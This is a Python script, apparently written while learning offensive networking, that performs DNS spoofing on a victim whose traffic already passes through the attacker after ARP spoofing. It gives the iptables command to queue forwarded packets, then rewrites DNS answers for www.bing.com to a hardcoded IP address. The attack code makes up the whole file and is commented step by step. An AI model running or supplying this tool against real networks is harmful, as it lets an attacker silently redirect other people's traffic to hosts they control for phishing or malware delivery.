#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

#the purpose of this program is to drop or accept packets being sent from a victims computer to the internet. it is intended
#to be used after already being the Man in the middle from our arp_spoof program. To be able to access these packets,
#we must first put them in a queue using iptables. That command in the terminal is below:
#iptables -I FORWARD -j NFQUEUE --queue-num 0
#When we are done, be sure to do iptables - flush to get rid of the iptables we created.


def process_packet(packet):
    #setting a variable named scapy_packet equal to the ip layer packet response
    scapy_packet = scapy.IP(packet.get_payload())

    #DNSRR is the DNS response. If our packet has a DNS response in it and the qname(website name) has 'www.bing.com' in
    #it, print our text and modify the packet using the ip address of the web host we want to spoof.
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="45.58.116.198")

            #modifies the packet so it uses our answer
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            #removing these values from our packet response so scapy will auto populate them with the correct values
            #based on our response
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))

    packet.accept()

#creating an instance of a netfilterqueue object and putting it in a variable called queue. We then bind our new
#variable to the queue number we set up previously with iptables, and add a callback function we created called
#process_packet
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()